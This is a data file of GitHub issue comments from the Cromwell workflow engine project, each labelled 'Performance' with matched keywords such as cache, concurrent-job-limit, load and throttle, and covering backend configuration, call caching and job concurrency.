Performance,"@natechols - so it works well for failed jobs. However, there seems to be some transient errors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:502,cache,cache-results,502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,2,"['cache', 'concurren']","['cache-results', 'concurrent-job-limit']"
Performance,"@olsonanl I think it depends on the version - I think(?) in newer versions a singularity hub image is cached, but (from actual experience) in _some_ version it's definitely not!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537243320:102,cache,cached,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537243320,1,['cache'],['cached']
Performance,@pgrosu I can assure you that nobody would like to see cromwell have the ability to scale to infinity and beyond on any arbitrary backend more than I :) OTOH I need to empower people to at least crawl prior to building out the running capability. Could we put together something which would provide better scalability for our purposes? Probably. However they have people who know this stuff a lot better than I do and we've got many other things on the todo list so for now the best course of action appears to be working w/ them to help parallelize our efforts.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645161:306,scalab,scalability,306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645161,1,['scalab'],['scalability']
Performance,@rhpvorderman @DavyCats -- did `mergeLibraries` cache? Would you mind posting the outputs of that task from the first/second run?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395070381:48,cache,cache,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395070381,1,['cache'],['cache']
Performance,"@rhpvorderman I have tried running cromwell with the `--metadata-output` flag. That's indicated in the JIRA issue.; For the tasks that fail to activate call caching I get the following metadata entry:; ```; ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff"",; ""hit"": false,; ""result"": ""Cache Miss""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-589857972:326,Cache,Cache,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-589857972,1,['Cache'],['Cache']
Performance,"@rhpvorderman ^^ would just need to keep in mind they do the lookup to get the docker size. After BCC2020 I want to revisit this PR, and could allow you to turn off the digest but keep call caching on?. The only catch i imagine is that you'd get a cache miss if you ran with / without that flag (as a digest vs floating tag would miss). I don't know for sure other technical challenges apart from that. --. My Scala is poor, so can only do minimal code level changes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660996406:248,cache,cache,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660996406,1,['cache'],['cache']
Performance,@rhpvorderman which backend are you using? I assume a SGE-like system. Do you have trouble with the qstat -j requests causing high load? Have you already implemented a similar system to the linked script?. The problem with just increasing this value is that it also slows checking for the rc file.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4905#issuecomment-488880044:131,load,load,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4905#issuecomment-488880044,1,['load'],['load']
Performance,"@ruchim Just want to say that I was looking for exactly this functionality (having different cromwells share a workflow database). Seems like it's still being developed; thanks for working on it. It would be most useful if combined with #4616 (caching results across engines). I could then run some Cromwell analyses on Broad's UGER cluster or Harvard's Odyssey cluster (where it doesn't cost extra), and other analyses on AWS or GCS, and have a shared database with reuse of cached results. If real-time database sharing is hard to make work, it would be enough to add a Cromwell command to import another Cromwell's database into its own, as an offline operation when no analyses are being run.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4370#issuecomment-468020886:476,cache,cached,476,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4370#issuecomment-468020886,1,['cache'],['cached']
Performance,"@ruchim This is not really a concern for us. We run our workflows on a local SGE cluster, therefore the consequence of requesting more memory than necessary is only that other jobs may be slower to run (longer queue time), but there isn't neccessarily a (direct) monetary cost for requesting more resources. I also don't believe that there is regularly a shortage of memory on our cluster.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4346#issuecomment-435056303:210,queue,queue,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4346#issuecomment-435056303,1,['queue'],['queue']
Performance,"@ruchim `mergeLibraries` would be run after the indexing step which is not getting call-cached, so no it would not get cached (or at least it will get rerun). I assume you're asking about this call because its output is given to the `mergedIndex` call. This is a different indexing step from the one I was referring to (`samtoolsIndex` in https://github.com/biowdl/aligning/tree/BIOWDL-25). Actually, `mergeLibraries` doesn't get run at all, because there is only one bam file (notice the if statement surrounding the call). `linkBam` is called instead at this point. If you're wondering about the input for the `samtoolsIndex` call, yes that call (`star`) gets cached.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395080386:88,cache,cached,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395080386,3,['cache'],['cached']
Performance,"@seandavi - implementing the config suggested by @TimurIs and removing the specification of `concurrent-job-limit` I was able to run the following workflow with out issue. ```; task t {; Int id; command { echo ""scatter index = ${id}"" }; runtime {; docker: ""ubuntu:latest""; cpu: 1; memory: ""512MB""; }; output { String out = read_string(stdout()) }; }. workflow w {; Array[Int] arr = range(1000); scatter(i in arr) { call t { input: id = i } }; output { Array[String] t_out = t.out }; }; ```. Approximate numbers:; * max # jobs observed in ""submitted"" state = 250 - 270; * max # jobs observed in ""running"" state = 20-30",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443399747:93,concurren,concurrent-job-limit,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443399747,1,['concurren'],['concurrent-job-limit']
Performance,"@seandavi Ah, it's something @kcibul whipped up which runs on google app engine which presents the JES API for trivial tasks - we've been using it to be able to run things which test the cromwell engine under load w/o having need to run up a large bill (or run into quota issues!) on JES. I've been starting to use it heavily and have run into some weird issues, such as this ticket and those unexpected actor death notifications from the other issue. I've been theorizing that they're due to responses from appengine which we don't see in JES but i need to verify that - and clearly that's not the case w/ the unexpected actor death ones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1662#issuecomment-260527636:209,load,load,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1662#issuecomment-260527636,1,['load'],['load']
Performance,"@seandavi I know that GCS != S3, but when I had a brief look at the [source](https://github.com/broadinstitute/cromwell/blob/3b29af0d8f116d63e1fcb85f5b4903fd615a5386/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L89) where that configuration `io` block is being used, `number-of-requests` is used to set a throttle on a fairly low-level Actor that at least at might be used by the AWS batch backend... I haven't looked at the implementation in detail. I'll do that tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436944065:322,throttle,throttle,322,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436944065,1,['throttle'],['throttle']
Performance,"@tAndreani `cpu` isn't a supported `runtime` value in the local backend (really, very few of them are). With the local backend Cromwell won't limit the resource usage of any job. We view the local backend more as a developmental/experimentation tool than something to be used in a real world scenario, so there's less attention paid to that sort of thing. The concurrent job limit could be used here as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-517051507:360,concurren,concurrent,360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-517051507,1,['concurren'],['concurrent']
Performance,"@tAndreani in terms of cromwell there's not a limit per se, although your underlying backend might get grouchy at you if you wind up submitting too many jobs. You could set the `concurrent-job-limit` config field to help with this if you do wind up with issues",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513922676:178,concurren,concurrent-job-limit,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513922676,1,['concurren'],['concurrent-job-limit']
Performance,"@tcibinan Thanks for the contribution! To expectation set, we'll aim to review your PR within a reasonable timeframe but we unfortunately can't make any firm guarantees of the timeline since we're always working to internal deadlines of our own!. My initial thought is:; 1. Since the filesystem is something that Cromwell cannot have any control over, a number of its assumptions might be invalidated (depending on how the workflow author uses the filesystem). That's probably fine, as long as both the author and the workflow runner are aware of it and can work around it.; 2. We probably want to have our own version of ""pre-computed inputs mounted by fuse"" with some more controls around the problems mentioned in (1.) to help keep our assumptions correct.; 3. None of those points are any worse than passing in `gs://` paths as strings and localizing them manually, so we shouldn't disallow people opting-in to fuse support like this if they really want to. Could you add some additional warning comments along these lines?; 1. Any inputs brought in via a Fuse filesystem will not be considered for call caching.; 1. Any outputs stored via a Fuse filesystem will not be recreated if a task is replayed from a call-cache hit.; 1. If the filesystem is writable, your job is potentially no longer idempotent - Cromwell may decide to retry your job for you, and you might get unforeseen file collisions or even incorrect results if that happens.; 1. This is a community contribution and not officially supported (at least not yet!) by the Cromwell team?. @ruchim I know you were looking at Fuse integration too. Do you have any thoughts on this?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5343#issuecomment-572896597:1218,cache,cache,1218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5343#issuecomment-572896597,1,['cache'],['cache']
Performance,"@tom-dyar @elerch Current assumption is that you have valid AWS Batch Job Queue with a Compute Environment, and a AWS S3 bucket for results. Associated with these are IAM instance and task roles, VPC, etc. We will be providing tutorials on this pre-Cromwell requirements soon (weeks). . The AWS conf file just needs the job queue ARN. And the S3 bucket.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395557543:74,Queue,Queue,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395557543,2,"['Queue', 'queue']","['Queue', 'queue']"
Performance,"@vdauwera I spotted the issue but it was @kshakir who ended up resolving it. I believe this had to do with the auth that was used to perform the read_* function, and not having access to the proper google credentials. I checked the [config](https://github.com/googlegenomics/pipelines-api-examples/blob/master/wdl_runner/cromwell_launcher/jes_template.conf) wdl_runner uses and I believe it's missing the goolge.auths key and the engine.filesystem.gcs.auth key in the config, which is probably what Cromwell requires to parse gcs files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165:133,perform,perform,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165,1,['perform'],['perform']
Performance,"@vsoch Thanks for testing this! This was indeed a major oversight on my behalf. . I did some further testing:. + It does not matter if you use a hashed container. Singularity will still look it up on the internet.; + The singularity cache does not store the file in an easily retrievable way:. ```; ~/.singularity/cache/oci-tmp/7c7e798af52365c2fa3c1c4606dcf8c1e2d5e502f49f1185d774655648175308$ ls; fastqc_0.11.9--0.sif fastqc@sha256_319b8d4eca0fc0367d192941f221f7fcd29a6b96996c63cbf8931dbb66e53348.sif; ```; You would have to hack with find etc. Dammit, this means this solution only works for fully connected nodes. And it means an alternate (more robust) solution needs to be hacked together in bash :scream: . On the other hand, I feel this could be fixed easily by singularity having a `--use-cache-first` flag, so it checks the cache first instead of checking the internet. I will investigate what is possible upstream.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498:233,cache,cache,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498,4,['cache'],"['cache', 'cache-first']"
Performance,@vsoch This config already does this by using exec. This way the binary image is created in the singularity cache dir.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630780758:108,cache,cache,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630780758,1,['cache'],['cache']
Performance,"@vsoch and @illusional I have processed your comments. I made it more clear why the `--containall` flag is so important and I dropped the list of stuff that Singularity does without the flag. Instead I focused on the way Singularity affects reproducibility and how this can be prevented by the containall flag. I have also removed any references to a particular version of Singularity, and provided alternatives for module load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628453342:423,load,load,423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628453342,1,['load'],['load']
Performance,"@wleepang , We're scattering by chromosome for any step using a scatter, so 25 concurrent jobs/sample. The number of simultaneous samples run at a time varies from 1-100+ depending on needs, and we're using multiple workflows, but some sub-wdls are shared between the larger workflows. And I'm not sure I really understand why a new job definition must be made for every call. I presume you're submitting jobs using a submit_job() API call where you can specify container overrides and set unique mount points versus having them pre-established in a job definition and calling that without any modification? . Scala is not my language so how those calls are being made and how the determination of whether or not a job definition already exists (regardless of it being correct in light of this bug) is not something I can easily determine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-504128934:79,concurren,concurrent,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-504128934,1,['concurren'],['concurrent']
Performance,"@wleepang I am little bit confused by concurrent-job-limit. Does this option means limit of the concurrent AWS Batch underlying computing jobs or limit of concurrent API calls to AWS Batch? This is totally different. Say, if I have 1000 samples and one job per sample, I would expect 1000 concurrent AWS Batch job (Array job with size of 1000), if it can not handle even 16 samples concurrently, it will make no sense for batch mode. If it means latter, although the limit is 16 API calls per second (let's assume concurrent jobs unit is per second), you can still submit an array job per API call which supports concurrent 1000 samples computing jobs under the hood since the concurrent number of API calls is not equal (actually not related to) the concurrent computing jobs launched by AWS Batch with which you can submit/query all jobs/jobs status in an array job with one api call.; One more question: my understanding is that AWS Batch backend will convert scatter jobs into an array job of AWS Batch, is that right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440747628:38,concurren,concurrent-job-limit,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440747628,9,['concurren'],"['concurrent', 'concurrent-job-limit', 'concurrently']"
Performance,"@yfarjoun Yeah, I agree. @vdauwera quickly provided a totally valid use case beyond ""I'm screwing around"". Specifically what I was concerned about here is providing a case where we allow corners to be cuttable for the implementer which then leave loaded guns sitting around for downstream users to shoot themselves with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323832814:247,load,loaded,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323832814,1,['load'],['loaded']
Performance,"@yfarjoun You're always using a DB, so what you're doing is using an in memory DB. Note that I've found that MySQL gives better performance. When you run against GCS are you also using the default in memory DB?. Are they both the same version? If so, what version. If develop, from when?. I did recently make some changes to develop that should tremendously help what this *might* be but there are also spots which are a lot more single threaded than one would like and it's possible you've found yourself in a situation where that's true on the SFS backend but not JES.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276766802:128,perform,performance,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276766802,1,['perform'],['performance']
Performance,"A bi-directional loaded gun sounds dangerous, what other ways can users shoot themselves?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325781805:17,load,loaded,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325781805,1,['load'],['loaded']
Performance,"A few immediate thoughts:. - What's the granularity of this value? ie per workflow, per cromwell server, per task?; - Should this be a ""happens without the end-user knowing"" or an ""end user has to choose"" type of a thing? ; - Or maybe it's ""in Firecloud it must not be overridden but outside of Firecloud it should be more flexible""; - Should this value (wherever it gets specified) be considered when deciding whether or not to call cache to a previous run (which may have been on a different subnet)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-418747764:434,cache,cache,434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-418747764,1,['cache'],['cache']
Performance,"A handcrafted version of this query: . ```; select; x2.`WORKFLOW_EXECUTION_UUID`,; x2.`WORKFLOW_NAME`,; x2.`WORKFLOW_STATUS`,; x2.`START_TIMESTAMP`,; x2.`END_TIMESTAMP`,; x2.`SUBMISSION_TIMESTAMP`,; x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID` ; from; WORKFLOW_METADATA_SUMMARY_ENTRY x2 ; join; (; select; WORKFLOW_EXECUTION_UUID ; from; CUSTOM_LABEL_ENTRY ; where; CUSTOM_LABEL_KEY = 'submissionIdKey' ; and CUSTOM_LABEL_VALUE = 'submissionIdValue'; ) s ; on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID ; join; (; select; WORKFLOW_EXECUTION_UUID ; from; CUSTOM_LABEL_ENTRY ; where; (; CUSTOM_LABEL_KEY = 'caas-collection-name' ; and CUSTOM_LABEL_VALUE = 'me@gmail.com'; ) ; or (; CUSTOM_LABEL_KEY = 'caas-collection-name' ; and CUSTOM_LABEL_VALUE = 'miguel-collection'; ); ) c ; on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID; ```. begets a much more performant`EXPLAIN` . ```; mysql> explain select x2.`WORKFLOW_EXECUTION_UUID`, x2.`WORKFLOW_NAME`, x2.`WORKFLOW_STATUS`, x2.`START_TIMESTAMP`, x2.`END_TIMESTAMP`, x2.`SUBMISSION_TIMESTAMP`, x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID` from WORKFLOW_METADATA_SUMMARY_ENTRY x2 join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where CUSTOM_LABEL_KEY = 'submissionIdKey' and CUSTOM_LABEL_VALUE = 'submissionIdValue') s on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'me@gmail.com') or (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'miguel-collection')) c on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID;; +----+-------------+--------------------+--------+---------------------------------------------+----------------------------------------+---------+---------------------------+------+------------------------------------+; | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |; +----+-------------+---------------",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459106279:869,perform,performant,869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459106279,1,['perform'],['performant']
Performance,A resume option with call cache skipping would be very useful. Another feature which could be related to this option is unit test capabilities. for example I had run a workflow before (successfully). now I have changed a specific part of it and just want to test it with the inputs provided till that step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-1201794626:26,cache,cache,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-1201794626,1,['cache'],['cache']
Performance,A/C write a unit test that characterizes the performance of heartbeat writing with and without autocommit.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-443798416:45,perform,performance,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-443798416,1,['perform'],['performance']
Performance,AC: ; 1. Delete endpoint that targets deleting intermediate output files.; 2. Cleanup of those intermediate outputs if they were utilized by the cache store.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-424981111:145,cache,cache,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-424981111,1,['cache'],['cache']
Performance,"AC:. **Case 1:** ; Benchmark the behavior of these endpoints given a few different style of workflows:; Option A: Hello World workflow; Option B: Five Dollar Genome workflow; Option C: CGA Production Workflow. For each case, run concurrent requests to the `/describe` endpoint , benchmark the response time and do so for a variety of concurrent requests: 15, 30, 50, 100... **Case 2:**; Another case can be to see how many raw GitHub pages we can resolve (via http imports) before we start seeing issues from Github -- and observe we fail gracefully.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456965771:229,concurren,concurrent,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456965771,3,"['concurren', 'response time']","['concurrent', 'response time']"
Performance,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3400,load,load,3400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['load'],['load']
Performance,AWS Batch works in a different way than current platforms and we are taking that into account for something we think will be great on release. Stay tuned to #3744 for more details and progress on this item,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395590745:148,tune,tuned,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395590745,1,['tune'],['tuned']
Performance,"Actor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa; 2020-10-13 19:03:01,200 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7151,cache,cache,7151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,"Actually it seems that the config I was using already had that line in it, set to 16. I've reduced the concurrent-job-limit to 8, and I'll see how it goes",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-434295499:103,concurren,concurrent-job-limit,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-434295499,1,['concurren'],['concurrent-job-limit']
Performance,Actually now that I think about it this is possible w/o a code change. The service registry stuff is loaded in dynamically by the conf file so you'd just need to not include a metadata service in your conf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245602916:101,load,loaded,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245602916,1,['load'],['loaded']
